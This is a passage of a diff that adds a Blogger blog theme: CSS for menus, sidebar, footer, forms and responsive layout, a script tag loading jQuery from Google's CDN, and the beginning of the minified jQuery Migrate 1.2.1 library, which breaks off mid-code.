+transition: all 1s;
+}
+#containernbt .menu-boxnbt ul ul a:hover,
+#containernbt .menu-boxnbt ul ul :hover > a {
+background-color: #dbdbdb !important;
+color: black !important;
+-webkit-transition: background-color 1s;
+transition: background-color 1s;
+}
+.menu-boxnbt ul ul {
+height: 0;
+position: absolute;
+left: 0px;
+top: 44px;
+visibility: hidden;
+width: 212px;
+}
+.menu-boxnbt ul ul ul {
+left: 212px;
+top: -1px;
+width: 212px;
+}
+.menu-boxnbt ul li:hover ul,
+.menu-boxnbt ul a:hover ul,
+.top-navigationnbt ul li:hover ul,
+.top-navigationnbt ul a:hover ul {
+height: auto;
+padding-bottom: 0;
+visibility: visible;
+}
+.menu-boxnbt ul :hover ul ul,
+.top-navigationnbt ul :hover ul ul {
+visibility: hidden;
+}
+.menu-boxnbt ul :hover ul :hover ul ul,
+.top-navigationnbt ul :hover ul :hover ul ul {
+visibility: hidden;
+}
+.menu-boxnbt ul :hover ul :hover ul,
+.top-navigationnbt ul :hover ul :hover ul {
+visibility: visible;
+}
+.menu-boxnbt ul :hover ul :hover ul :hover ul,
+.top-navigationnbt ul :hover ul :hover ul :hover ul {
+visibility: visible;
+}
+#containernbt .menu-boxnbt .current-menu-item > a,
+#containernbt .menu-boxnbt .current-menu-ancestor > a,
+#containernbt .menu-boxnbt .current_page_item > a,
+#containernbt .menu-boxnbt .current-page-ancestor > a {
+color: black;
+}
+#containernbt .menu-boxnbt .sub-menu .current-menu-item > a,
+#containernbt .menu-boxnbt .sub-menu .current-menu-ancestor > a,
+#containernbt .menu-boxnbt .sub-menu .current_page_item > a,
+#containernbt .menu-boxnbt .sub-menu .current-page-ancestor > a {
+background-color: #ededed;
+color: black !important;
+}
+.selectnav {
+display: none;
+}
+#wrappernbt .sticky-navnbt {
+max-width: 1012px;
+position: fixed;
+top: 0;
+z-index: 200;
+}
+.admin-barnbt .sticky-navnbt {
+top: 32px !important;
+}
+/* top navigation */
+#top-navigation-wrappernbt {
+background: #190F0E;
+border-bottom: 1px solid #633a37;
+float: left;
+height: auto;
+position: relative;
+width: 100%;
+z-index: 150;
+}
+.top-navigationnbt {
+height: auto;
+margin: 0 auto;
+min-height: 34px;
+position: relative;
+width: 100%;
+}
+.top-navigationnbt ul {
+float: left;
+list-style-type: none;
+margin: 0;
+max-width: 900px;
+position: relative;
+}
+.top-navigationnbt ul ul {
+background: #ededed;
+margin: 0;
+width: 250px;
+z-index: 110;
+}
+.top-navigationnbt ul li {
+float: left;
+height: 34px;
+line-height: 34px;
+position: relative;
+}
+.top-navigationnbt ul .last-menu-item {
+margin-right: 0;
+}
+.top-navigationnbt ul ul li {
+border-bottom: 1px solid #d9d9d9;
+display: block;
+height: auto;
+line-height: 30px;
+margin: 0;
+min-height: 30px;
+position: relative;
+width: 250px;
+}
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt ul ul .last-menu-item {
+border-bottom: none;
+}
+.top-navigationnbt a,
+.top-navigationnbt a:visited {
+color: #f0d8d5;
+display: block;
+float: left;
+font-size: 13px;
+height: 34px;
+line-height: 34px;
+margin: 0 20px 0 0;
+padding: 0;
+text-align: center;
+text-decoration: none;
+}
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt ul ul a,
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt ul ul a:visited {
+color: #777777;
+display: block;
+font-size: 13px;
+font-weight: normal;
+height: auto;
+line-height: 30px;
+margin: 0;
+min-height: 30px;
+padding: 0 0 0 16px;
+text-align: left;
+width: 234px;
+}
+.top-navigationnbt ul a:hover,
+.top-navigationnbt ul :hover > a {
+color: white;
+-webkit-transition: color 1s;
+transition: color 1s;
+}
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt ul ul a:hover,
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt ul ul :hover > a {
+background-color: #dbdbdb;
+color: #333333;
+-webkit-transition: background-color 1s;
+transition: background-color 1s;
+}
+.top-navigationnbt ul ul {
+border-top: 1px solid #633a37;
+height: 0;
+position: absolute;
+left: 0;
+top: 34px;
+visibility: hidden;
+width: 250px;
+}
+.top-navigationnbt ul ul ul {
+left: 250px;
+top: -1px;
+width: 250px;
+}
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt .current-menu-item > a,
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt .current-menu-ancestor > a,
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt .current_page_item > a,
+#wrappernbt #top-navigation-wrappernbt .top-navigationnbt .current-page-ancestor > a {
+color: white;
+}
+.header-iconsnbt {
+height: 20px;
+position: absolute;
+right: 0;
+top: 7px;
+width: auto;
+}
+#wrappernbt .top-navigationnbt .header-iconsnbt a,
+#wrappernbt .top-navigationnbt .header-iconsnbt a img {
+display: block;
+height: 20px;
+}
+.top-navigationnbt .header-iconsnbt a img {
+opacity: 0.5;
+filter: alpha(opacity=50);
+}
+.top-navigationnbt .social-iconnbt {
+float: left;
+margin: 0 0 0 5px;
+width: 20px;
+}
+.top-navigationnbt .header-iconsnbt a img:hover {
+opacity: 1;
+filter: alpha(opacity=100);
+-webkit-transition: opacity 1s;
+transition: opacity 1s;
+}
+/* main content
+-------------------------------------------------------------- */
+.content-headline {
+float: left;
+margin: 0 0 20px;
+width: 100%;
+}
+.entry-headlinenbt {
+border-bottom: 1px solid #e0e0e0;
+color: black;
+font-size: 20px;
+line-height: 100%;
+margin: 0 0 3px;
+padding: 0 0 8px;
+position: relative;
+z-index: 50;
+text-transform: uppercase;
+}
+.home-latest-postsnbt .entry-headlinenbt {
+margin-bottom: 25px;
+}
+#contentnbt p,
+#contentnbt ul,
+#contentnbt ol,
+#contentnbt table,
+#contentnbt address {
+margin-bottom: 15px;
+}
+#contentnbt ul ul,
+#contentnbt ol ol,
+#contentnbt ol ul,
+#contentnbt ul ol {
+margin-bottom: 0;
+}
+.home-latest-postsnbt {
+float: left;
+margin-bottom: 10px;
+position: relative;
+width: 100%;
+}
+#sidebarnbt .home-latest-postsnbt,
+#footernbt .home-latest-postsnbt {
+display: none;
+}
+#main-contentnbt .post-metanbt {
+clear: both;
+color: #999999;
+font-size: 13px;
+line-height: 21px;
+padding-bottom: 5px;
+margin: 0px 0 0;
+}
+.singlenbt #main-contentnbt #contentnbt .post-metanbt {
+margin: 0;
+}
+#main-contentnbt .post-metanbt span {
+}
+#main-contentnbt .post-metanbt .post-info-authornbt {
+border-left: none;
+padding-left: 0;
+}
+#main-contentnbt .post-infonbt {
+border-top: 1px solid #e8e8e8;
+clear: both;
+color: #999999;
+/*float: left;*/
+font-size: 12px;
+line-height: 21px;
+margin: 6px 0 0;
+padding: 0;
+width: 100%;
+}
+.singlenbt #main-contentnbt #contentnbt .post-infonbt {
+border-bottom: 1px solid #e8e8e8;
+margin: 0 0 20px;
+}
+.post-infonbt a,
+.post-metanbt a {
+color: #999999 !important;
+text-decoration: none;
+}
+.post-infonbt a:hover,
+.post-metanbt a:hover {
+color: #111111 !important;
+-webkit-transition: color 1s;
+transition: color 1s;
+}
+.post-infonbt span {
+/*
+display: inline-block;
+min-height: 16px;
+line-height: 16px;
+padding: 0 0 0 22px;*/
+}
+#main-contentnbt .post-infonbt .post-categorynbt,
+#main-contentnbt .post-infonbt .post-tagsnbt {
+/*float: left;*/
+margin: 0;
+padding: 6px 0;
+/*width: 50%;*/
+}
+#main-contentnbt .post-infonbt .post-tagsnbt {
+padding-left: 5%;
+text-align: right;
+width: 45%;
+}
+.post-infonbt .post-info-categorynbt {
+background: left top no-repeat url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrGWSyjUTOr85zZz6YsPvsAd2IrI3K5UGYcF1y07resTvNEnvQVLOt0bjrMBR2noGvT-mGywe88pf2z461RLgkU-hlO9IIaeEKhY0-ESeU_ywQ_LS_zZZbE6-nOyevtFs1HGnqagEq5JKF/s1600/icon-category.png);
+display: inline-block;
+min-height: 16px;
+line-height: 16px;
+padding: 0 0 0 22px;
+}
+.post-infonbt .post-info-tagsnbt {
+background: left top no-repeat url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHuhINgbMmgAlaTEbmH3gFeMIvS2oT0bZL0YYfhy0Yyovm3Ragn5EG0wdlGJiQUEIvXfXsjQDCQ6gEtWYXO60pVOUMAyHSM9d67HIGevnEAaBfT1vtVvKzU-RQhRIrl8NHqE9RNUSm0KPv/s1600/icon-tag.png);
+}
+/* default post entry */
+.post-entrynbt {
+border-bottom: 1px solid #e8e8e8;
+float: left;
+margin-bottom: 25px;
+position: relative;
+width: 100%;
+}
+#main-contentnbt .stickynbt {
+background-color: #f0f0f0;
+padding: 20px 3% 0;
+width: 94%;
+}
+.post-entry-content-wrappernbt {
+padding: 3px 0 0;
+}
+.post-entry-contentnbt {
+/*margin-bottom: -12px;
+margin-top: -5px;*/
+}
+.post-entry-contentnbt h1 {
+font-size: 21px;
+}
+.post-entry-contentnbt h2 {
+font-size: 19px;
+}
+#main-contentnbt .post-entrynbt .post-entry-headlinenbt {
+font-size: 21px;
+line-height: 100%;
+margin: 0 0 7px;
+}
+.post-entrynbt .post-entry-headlinenbt a {
+color: #3B2720;
+text-decoration: none;
+}
+.post-entrynbt .post-entry-headlinenbt a:hover {
+color: black;
+-webkit-transition: color 1s;
+transition: color 1s;
+}
+.post-entrynbt .read-more-buttonnbt {
+background-color: #b56a63;
+color: white !important;
+display: inline-block;
+font-size: 12px;
+line-height: 12px;
+margin: 8px 0 3px;
+padding: 6px 8px;
+text-decoration: none;
+text-transform: uppercase;
+}
+.post-entrynbt .read-more-buttonnbt:hover {
+background-color: #633a37;
+-webkit-transition: background-color 1s;
+transition: background-color 1s;
+}
+/* sidebar
+-------------------------------------------------------------- */
+#sidebarnbt .widget {
+color: #333333;
+float: left;
+font-size: 13px;
+margin-bottom: 23px;
+width: 100%;
+}
+#sidebarnbt .widget h2, #sidebarnbt .widget h3 {
+border-bottom: 1px solid #e8e8e8;
+color: #333333;
+font-family: Oswald, Arial, Helvetica, sans-serif;
+font-size: 19px;
+margin: 0 0 5px;
+padding: 0 0 5px;
+position: relative;
+}
+#sidebarnbt .widget h2 a, #sidebarnbt .widget h3 a {
+color: #333333;
+text-decoration: none;
+}
+#sidebarnbt .widget img {
+height: auto;
+max-width: 100%;
+}
+#sidebarnbt .widget,
+#sidebarnbt .widget ul li,
+#sidebarnbt .widget ol li {
+color: #333333;
+font-size: 13px;
+}
+#sidebarnbt .widget ul {
+margin: 0;
+}
+#sidebarnbt .widget ul ul {
+margin-top: 0;
+}
+#sidebarnbt .widget ul li {
+background: left top no-repeat url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinhbQ7a2etu4AhQyv0-0SP-YuA9oe1wJh2JIZmDXUvahMUc6zL0KZtA2dnXuzUa2P7NJnzlclhBh0jfFZA79OCxzvS7ehjXK9GLP-Hhq7u3ICkhZR5wQaN6N8LC6racZCjheB3o7f5TDx9/s1600/sidebar-li.png);
+height: auto;
+line-height: 32px;
+list-style-type: none;
+min-height: 32px;
+padding-left: 14px;
+border-bottom: 1px solid #eee;
+}
+#sidebarnbt .widget a {
+color: #b56a63;
+text-decoration: underline;
+}
+#sidebarnbt .widget ul li a {
+text-decoration: none;
+}
+#sidebarnbt .widget a:hover {
+color: black !important;
+text-decoration: none;
+-webkit-transition: color 1s;
+transition: color 1s;
+}
+/* footer
+-------------------------------------------------------------- */
+#wrapper-footernbt {
+background: #190F0E;
+border-top: 1px solid #633a37;
+}
+#footernbt p,
+#footernbt ul li,
+#footernbt ol li {
+color: white;
+font-size: 13px;
+}
+#footernbt .footer-widget-areanbt p,
+#footernbt .footer-widget-areanbt ul,
+#footernbt .footer-widget-areanbt ol {
+margin-bottom: 2px;
+}
+#footernbt table,
+#footernbt td,
+#footernbt th {
+border-color: black;
+color: white;
+}
+#footernbt a {
+color: #f0d8d5;
+}
+.footer-widget-areanbt {
+float: left;
+height: auto;
+margin-right: 29px;
+padding: 30px 0 4px;
+position: relative;
+width: 318px;
+z-index: 50;
+}
+#footernbt .footer-widget-areanbt-3 {
+margin-right: 0;
+}
+#footernbt .widget {
+margin-bottom: 21px;
+}
+#footernbt .widget h2, #footernbt .widget h3 {
+border-bottom: 1px solid #633a37;
+color: #f0d8d5;
+font-family: Oswald, Arial, Helvetica, sans-serif;
+font-size: 19px;
+line-height: 100%;
+margin-bottom: 5px;
+padding-bottom: 8px;
+}
+.footer-signaturenbt {
+background: #633a37;
+border-top: 1px solid #54312f;
+float: left;
+position: relative;
+width: 100%;
+z-index: 50;
+}
+.footer-signaturenbt .footer-signature-contentnbt {
+color: white;
+font-size: 12px;
+line-height: 22px;
+min-height: 42px;
+text-align: center;
+}
+.footer-signaturenbt .footer-signature-contentnbt p {
+color: white;
+font-size: 12px;
+line-height: 22px;
+min-height: 22px;
+padding: 10px 0;
+text-align: center;
+}
+.footer-signaturenbt .footer-signature-contentnbt a {
+color: #f0d8d5;
+}
+/* default widgets
+-------------------------------------------------------------- */
+#sidebarnbt .widget img,
+#footernbt .widget img {
+padding-top: 3px;
+}
+#sidebarnbt .widget select {
+margin-top: 3px;
+width: 100%;
+}
+#sidebarnbt .widget #searchformnbt {
+margin-top: 10px;
+}
+/* form fields
+-------------------------------------------------------------- */
+input[type="text"],
+input[type="file"],
+input[type="password"],
+input[type="number"],
+input[type="search"],
+input[type="email"],
+input[type="url"],
+textarea,
+select {
+background-color: #f2f2f2;
+border: 1px solid #e6e6e6;
+color: #333333;
+line-height: normal;
+padding: 5px;
+width: 50%;
+}
+textarea {
+overflow: auto;
+vertical-align: top;
+width: 98%;
+}
+input[type="submit"],
+input[type="reset"] {
+background: #b56a63;
+border: none;
+border-radius: 0 !important;
+box-shadow: none;
+color: white !important;
+cursor: pointer;
+font-size: 15px;
+height: auto;
+margin-top: 5px;
+padding: 7px 10px;
+text-align: center;
+text-decoration: none;
+text-shadow: none;
+}
+input[type="submit"]:hover,
+input[type="reset"]:hover {
+background-color: #633a37;
+-webkit-transition: background-color 1s;
+transition: background-color 1s;
+}
+#searchformnbt .searchform-wrappernbt {
+height: 31px;
+position: relative;
+width: 100%;
+}
+.header-contentnbt #searchformnbt .searchform-wrappernbt {
+margin-top: -15px;
+position: absolute;
+right: 0;
+top: 50%;
+width: 200px;
+z-index: 100;
+}
+#searchformnbt .searchform-wrappernbt #snbt {
+background-color: #ffe5e3;
+border-color: #190F0E;
+font-size: 13px;
+height: 19px;
+padding: 5px 0 5px 3%;
+position: absolute;
+left: 0;
+top: 0;
+width: 96%;
+}
+.header-contentnbt #searchformnbt .searchform-wrappernbt #snbt {
+padding: 5px 0 5px 4%;
+width: 95%;
+}
+#searchformnbt .searchform-wrappernbt .sendnbt {
+background-color: #190F0E;
+background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCZOGTOlAkxuctXcIUjOHeRv3XBG0f5wZvmmfEvtI74m_Cm1HY6S_aBnwtmiGTmGAeJWH_yvCGjymFAaLOelYmkro6UO5jvOKPXFG6dht0ODOPEHC49m7Rg3DRmtZ9Nxlo0vYZBb77ZTZC/s1600/searchform-send.png);
+border: none;
+cursor: pointer;
+height: 31px;
+position: absolute;
+right: 0;
+top: 0;
+width: 31px;
+z-index: 20;
+}
+#searchformnbt .sendnbt:hover {
+background-color: #633a37;
+-webkit-transition: background-color 1s;
+transition: background-color 1s;
+}
+/* media queries
+-------------------------------------------------------------- */
+@media screen and (max-width: 1012px) {
+#wrappernbt .footer-signature-contentnbt,
+#wrappernbt .top-navigationnbt,
+#wrappernbt #main-contentnbt,
+#wrappernbt #headernbt,
+#wrappernbt #footernbt {
+max-width: 90%;
+width: 90%;
+}
+#wrappernbt #contentnbt {
+margin: 28px 5% 10px;
+width: 90% !important;
+}
+#wrappernbt #sidebarnbt {
+float: left;
+margin: 0 5% 10px;
+width: 90%;
+}
+#wrappernbt .site-titlenbt,
+#wrappernbt .site-descriptionnbt,
+#wrappernbt #headernbt .header-contentnbt .header-logonbt {
+float: left;
+max-width: 100%;
+}
+#wrappernbt .header-contentnbt #searchformnbt .searchform-wrappernbt {
+float: left;
+margin: 20px 0 0;
+position: relative;
+right: 0;
+top: 0;
+width: 100%;
+}
+#wrappernbt #containernbt .sticky-navnbt {
+max-width: 90%;
+}
+#wrappernbt .top-navigationnbt {
+height: 34px;
+}
+#wrappernbt .menu-boxnbt {
+min-height: 44px;
+}
+.js #navnbt,
+.js #top-navnbt {
+display: none;
+}
+.js .selectnav {
+background: white;
+border: 1px solid #cccccc;
+color: #333333;
+display: block;
+float: left;
+height: 30px;
+margin: 7px 0 0 5%;
+padding: 0;
+position: relative;
+text-transform: uppercase;
+width: 90%;
+}
+.js #top-navigation-wrappernbt .selectnav {
+background: #190F0E;
+border: 1px solid #633a37;
+color: white;
+height: 26px;
+margin: 4px 0 0;
+width: 50%;
+}
+#wrappernbt #wrapper-footernbt #footernbt {
+padding: 30px 0 4px;
+width: 100%;
+}
+#footernbt .footer-widget-areanbt {
+margin: 0;
+padding: 0;
+width: 100%;
+}
+#wrappernbt #main-content-innernbt .line-topnbt,
+#wrappernbt #main-content-innernbt .line-bottomnbt {
+display: none;
+}
+}
+@media screen and (max-width: 782px) {
+.admin-barnbt #containernbt .sticky-navnbt {
+top: 46px !important;
+}
+}
+@media screen and (max-width: 600px) {
+.admin-barnbt #containernbt .sticky-navnbt {
+top: 0 !important;
+}
+}
+/* print
+-------------------------------------------------------------- */
+@media print {
+html body {
+background: none !important;
+font-family: Arial, Helvetica, sans-serif !important;
+}
+h1, h2, h3, h4, h5, h6 {
+font-family: Arial, Helvetica, sans-serif !important;
+}
+#wrappernbt #main-content-innernbt .line-topnbt,
+#wrappernbt #main-content-innernbt .line-bottomnbt,
+#top-navigation-wrappernbt,
+#wrapper-footernbt,
+#headernbt,
+#sidebarnbt,
+.header-imagenbt,
+.menu-boxnbt,
+.scroll-topnbt {
+display: none !important;
+}
+#wrappernbt #main-content-innernbt {
+border-top: none !important;
+border-bottom: none !important;
+}
+#wrappernbt #contentnbt {
+margin: 0 !important;
+width: 100% !important;
+}
+#wrappernbt #main-content-innernbt {
+-webkit-box-shadow: none;
+-moz-box-shadow:    none;
+box-shadow:         none;
+}
+}
+h2.date-header {
+margin: 10px 0px;
+display: none;
+}
+.main .widget {
+margin: 0 0 5px;
+padding: 0 0 2px;
+}
+.main .Blog {
+border-bottom-width: 0;
+}
+#header .description {
+}
+/* Comments----------------------------------------------- */
+#comments {
+padding:10px;
+margin-bottom:20px;
+}
+#comments h4 {
+font-size:22px;
+margin-bottom:10px;
+}
+#comments ol {
+margin-left:0px;
+}
+.deleted-comment {
+font-style: italic;
+color: gray;
+}
+#blog-pager-newer-link {
+float: left;
+}
+#blog-pager-older-link {
+float: right;
+}
+#blog-pager {
+text-align: center;
+padding:5px;
+margin:10px 0;
+font-size: 32px;
+}
+.feed-links {
+clear: both;
+}
+.comment-form {
+}
+#navbar-iframe {
+height: 0;
+visibility: hidden;
+display: none;
+}
+.author-profile {
+background: #f6f6f6;
+border: 1px solid #eee;
+margin: 10px 0 10px 0;
+padding: 8px;
+overflow: hidden;
+}
+.author-profile img {
+border: 1px solid #ddd;
+float: left;
+margin-right: 10px;
+}
+.post-iconspbt {
+margin: 5px 0 0 0;
+padding: 0px;
+}
+.post-locationpbt {
+margin: 5px 0;
+padding: 0px;
+}
+.related-postbwrap {
+margin: 10px auto 0;
+}
+.related-postbwrap h4 {
+font-weight: bold;
+margin: 10px 0;
+}
+.related-post-style-2,.related-post-style-2 li {
+list-style: none;
+margin: 0;
+padding: 0;
+}
+.related-post-style-2 li {
+border-top: 0px solid #eee;
+overflow: hidden;
+padding: 10px 0px;
+}
+.related-post-style-2 li:first-child {
+border-top: none;
+}
+.related-post-style-2 .related-post-item-thumbnail {
+width: 80px;
+height: 80px;
+max-width: none;
+max-height: none;
+background-color: transparent;
+border: none;
+float: left;
+margin: 2px 10px 0 0;
+padding: 0;
+}
+.related-post-style-2 .related-post-item-title {
+font-weight: normal;
+font-size: 100%;
+}
+.related-post-style-2 .related-post-item-summary {
+display: block;
+}
+.pbtsharethisbutt {
+overflow: hidden;
+padding: 5px 0 2px;
+margin: 0;
+}
+.pbtsharethisbutt ul {
+list-style: none;
+list-style-type: none;
+margin: 0;
+padding: 0;
+}
+.pbtsharethisbutt ul li {
+float: left;
+margin: 0;
+padding: 0;
+}
+.pbtsharethisbutt ul li a {
+padding: 0 10px;
+display: inline-block;
+text-decoration: none;
+}
+.pbtsharethisbutt ul li a:hover {
+}
+.separator a[style="margin-left: 1em; margin-right: 1em;"] {margin-left: auto!important;margin-right: auto!important;}
+.separator a[style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"] {clear: none !important; float: none !important; margin-bottom: 0em !important; margin-right: 0em !important;}
+.separator a[style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"] img {float: left !important; margin: 0px 10px 10px 0px;}
+.separator a[style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"] {clear: none !important; float: none !important; margin-bottom: 0em !important; margin-left: 0em !important;}
+.separator a[style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"] img {float: right !important; margin: 0px 0px 10px 10px;}
+.PopularPosts .widget-content ul li {
+padding:6px 0px;
+}
+.reaction-buttons table{
+border:none;
+margin-bottom:5px;
+}
+.reaction-buttons table, .reaction-buttons td{
+border:none !important;
+}
+.pbtthumbimg {
+float:left;
+margin:0px 10px 5px 0px;
+padding:4px;
+border:0px solid #eee;
+background:none;
+width:200px;
+height:auto;
+}
+.CSS_LIGHTBOX {
+z-index: 10000 !important;
+}
+/* footer dinamis */
+#footer2 {
+align: center;
+position: fixed;
+border-top: 1px solid #333333;
+border-bottom: 1px solid #333333;
+background-color: #996666;
+width: 100%;
+height:25px;
+text-align: left;
+color: #000000;
+font-family: Arial;
+font-weight: bold;
+font-size: 15px;
+z-index:10000;
+bottom:0;
+}
+
+--></style>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js' type='text/javascript'></script>
+<script type='text/javascript'>
+//<![CDATA[
+
+/*! jQuery Migrate v1.2.1 | (c) 2005, 2013 jQuery Foundation, Inc. and other contributors | jquery.org/license */
+jQuery.migrateMute===void 0&&(jQuery.migrateMute=!0),function(e,t,n){function r(n){var r=t.console;i[n]||(i[n]=!0,e.migrateWarnings.push(n),r&&r.warn&&!e.migrateMute&&(r.warn("JQMIGRATE: "+n),e.migrateTrace&&r.trace&&r.trace()))}function a(t,a,i,o){if(Object.defineProperty)try{return Object.defineProperty(t,a,{configurable:!0,enumerable:!0,get:function(){return r(o),i},set:function(e){r(o),i=e}}),n}catch(s){}e._definePropertyBroken=!0,t[a]=i}var i={};e.migrateWarnings=[],!e.migrateMute&&t.console&&t.console.log&&t.console.log("JQMIGRATE: Logging is active"),e.migrateTrace===n&&(e.migrateTrace=!0),e.migrateReset=function(){i={},e.migrateWarnings.length=0},"BackCompat"===document.compatMode&&r("jQuery is not compatible with Quirks Mode");var o=e("<input/>",{size:1}).attr("size")&&e.attrFn,s=e.attr,u=e.attrHooks.value&&e.attrHooks.value.get||function(){return null},c=e.attrHooks.value&&e.attrHooks.value.set||function(){return n},l=/^(?:input|button)$/i,d=/^[238]$/,p=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,f=/^(?:checked|selected)$/i;a(e,"attrFn",o||{},"jQuery.attrFn is deprecated"),e.attr=function(t,a,i,u){var c=a.toLowerCase(),g=t&&t.nodeType;return u&&(4>s.length&&r("jQuery.fn.attr( props, pass ) is deprecated"),t&&!d.test(g)&&(o?a in o:e.isFunction(e.fn[a])))?e(t)[a](i):("type"===a&&i!==n&&l.test(t.nodeName)&&t.parentNode&&r("Can't change the 'type' of an input or button in IE 6/7/8"),!e.attrHooks[c]&&p.test(c)&&(e.attrHooks[c]={get:function(t,r){var a,i=e.prop(t,r);return i===!0||"boolean"!=typeof i&&(a=t.getAttributeNode(r))&&a.nodeValue!==!1?r.toLowerCase():n},set:function(t,n,r){var a;return n===!1?e.removeAttr(t,r):(a=e.propFix[r]||r,a in t&&(t[a]=!0),t.setAttribute(r,r.toLowerCase())),r}},f.test(c)&&r("jQuery.fn.attr('"+c+"') may use property instead of attribute")),s.call(e,t,a,i))},e.attrHooks.value={get:function(e,t){var n=(e.nodeName||"").toLowerCase();return"button"===n?u.apply(this,arguments):("input"!==n&&"option"!==n&&r("jQuery.fn.attr('value') no longer gets properties"),t in e?e.value:null)},set:function(e,t){var a=(e.nodeName||"").toLowerCase();return"button"===a?c.apply(this,arguments):("input"!==a&&"option"!==a&&r("jQuery.fn.attr('value', val) no longer sets properties"),e.value=t,n)}};var g,h,v=e.fn.init,m=e.parseJSON,y=/^([^<]*)(<[\w\W]+>)([^>]*)$/;e.fn.init=function(t,n,a){var i;return t&&"string"==typeof t&&!e.isPlainObject(n)&&(i=y.exec(e.trim(t)))&&i[0]&&("<"!==t.charAt(0)&&r("$(html) HTML strings must start with '<' character"),i[3]&&r("$(html) HTML text after last tag is ignored"),"#"===i[0].charAt(0)&&(r("HTML string cannot start with a '#' character"),e.error("JQMIGRATE: Invalid selector string (XSS)")),n&&n.context&&(n=n.context),e.parseHTML)?v.call(this,e.parseHTML(i[2],n,!0),n,a):v.apply(this,arguments)},e.fn.init.prototype=e.fn,e.parseJSON=function(e){return e||null===e?m.apply(this,arguments):(r("jQuery.parseJSON requires a valid JSON string"),null)},e.uaMatch=function(e){e=e.toLowerCase();var t=/(chrome)[ \/]([\w.]+)/.exec(e)||/(webkit)[ \/]([\w.]+)/.exec(e)||/(opera)(?:.*version|)[ \/]([\w.]+)/.exec(e)||/(msie) ([\w.]+)/.exec(e)||0>e.indexOf("compatible")&&/(mozilla)(?:.*? rv:([\w.]+)|)/.exec(e)||[];return{browser:t[1]||"",version:t[2]||"0"}},e.browser||(g=e.uaMatch(navigator.userAgent),h={},g.browser&&(h[g.browser]=!0,h.version=g.version),h.chrome?h.webkit=!0:h.webkit&&(h.safari=!0),e.browser=h),a(e,"browser",e.browser,"jQuery.browser is deprecated"),e.sub=function(){function t(e,n){return new t.fn.init(e,n)}e.extend(!0,t,this),t.superclass=this,t.fn=t.prototype=this(),t.fn.constructor=t,t.sub=this.sub,t.fn.init=function(r,a){return a&&a instanceof e&&!(a instanceof t)&&(a=t(a)),e.fn.init.call(this,r,a,n)},t.fn.init.prototype=t.fn;var n=t(document);return r("jQuery.sub() is deprecated"),t},e.ajaxSetup({converters:{"text json":e.parseJSON}});var b=e.fn.data;e.fn.data=function(t){var a,i,o=this[0];return!o||"events"!==t||1!==arguments.length||(a=e.data(o,t),i=e._data(o,t),a!==n&&a!==i||i===n)?b.apply(this,arguments):(r("Use of jQuery.fn.data('events') is deprecated"),i)};var j=/\/(java|ecma)script/i,w=e.fn.andSelf||e.fn.addBack;e.fn.andSelf=function(){return r("jQuery.fn.andSelf() replaced by jQuery.fn.addBack()"),w.apply(this,arguments)},e.clean||(e.clean=function(t,a,i,o){a=a||document,a=!a.nodeType&&a[0]||a,a=a.ownerDocument||a,r("jQuery.clean() is deprecated");var s,u,c,l,d=[];if(e.merge(d,e.buildFragment(t,a).childNodes),i)for(c=function(e){return!e.type||j.test(e.type)?o?o.push(e.parentNode?e.parentNode.removeChild(e):e):i.appendChild(e):n},s=0;null!=(u=d[s]);s++)e.nodeName(u,"script")&&c(u)||(i.appendChild(u),u.getElementsByTagName!==n&&(l=e.grep(e.merge([],u.getElementsByTagName("script")),c),d.splice.apply(d,[s+1,0].concat(l)),s+=l.length));return d});var Q=e.event.add,x=e.event.remove,k=e.event.trigger,N=e.fn.toggle,T=e.fn.live,M=e.fn.die,S="ajaxStart|ajaxStop|ajaxSend|ajaxComplete|ajaxError|ajaxSuccess",C=RegExp("\\b(?:"+S+")\\b"),H=/(?:^|\s)hover(\.\S+|)\b/,A=function(t){return"string"!=typeof t||e.event.special.hover?t:(H.test(t)&&r("'hover' pseudo-event is deprecated, use 'mouseenter mouseleave'"),t&&t.replace(H,"mouseenter$1 mouseleave$1"))};e.event.props&&"attrChange"!==e.event.props[0]&&e.event.props.unshift("attrChange","attrName","relatedNode","srcElement"),e.event.dispatch&&a(e.event,"handle",e.event.dispatch,"jQuery.event.handle is undocumented and deprecated"),e.event.add=function(e,t,n,a,i){e!==document&&C.test(t)&&r("AJAX events should be attached to document: "+t),Q.call(this,e,A(t||""),n,a,i)},e.event.remove=function(e,t,n,r,a){x.call(this,e,A(t)||"",n,r,a)},e.fn.error=function(){var e=Array.prototype.slice.call(arguments,0);return r("jQuery.fn.error() is deprecated"),e.splice(0,0,"error"),arguments.length?this.bind.apply(this,e):(this.triggerHandler.apply(this,e),this)},e.fn.toggle=function(t,n){if(!e.isFunction(t)||!e.isFunction(n))return N.apply(this,arguments);r("jQuery.fn.toggle(handler, handler...) is deprecated");var a=arguments,i=t.guid||e.guid++,o=0,s=function(n){var r=(e._data(this,"lastToggle"+t.guid)||0)%o;return e._data(this,"lastToggle"+t.guid,r+1),n.preventDefault(),a[r].apply(this,arguments)||!1};for(s.guid=i;a.length>o;)a[o++].guid=i;return this.click(s)},e.fn.live=function(t,n,a){return r("jQuery.fn.live() is deprecated"),T?T.apply(this,arguments):(e(this.context).on(t,this.selector,n,a),this)},e.fn.die=function(t,n){return r("jQuery.fn.die() is deprecated"),M?M.apply(this,arguments):(e(this.context).off(t,this.selector||"**",n),this)},e.event.trigger=function(e,t,n,a){return n||C.test(e)||r("Global events are undocumented and deprecated"),k.call(this,e,t,n||document,a)},e.each(S.split("|"),function(t,n){e.event.special[n]={setup:function(){var t=this;return 